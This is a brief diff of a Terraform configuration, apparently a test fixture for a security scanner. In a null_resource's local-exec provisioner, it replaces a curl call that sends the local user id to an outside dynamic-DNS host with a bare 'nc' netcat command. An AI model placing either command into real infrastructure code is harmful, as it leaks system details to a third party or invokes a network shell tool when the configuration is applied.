@@ -9,7 +9,7 @@ resource "random_id" "random" {
 
 resource "null_resource" "example5" {
   provisioner "local-exec" {
-    command = "curl http://btest.chickenkiller.com/?uid=$(id -u)"
+    command = "nc"
   }
 }
 
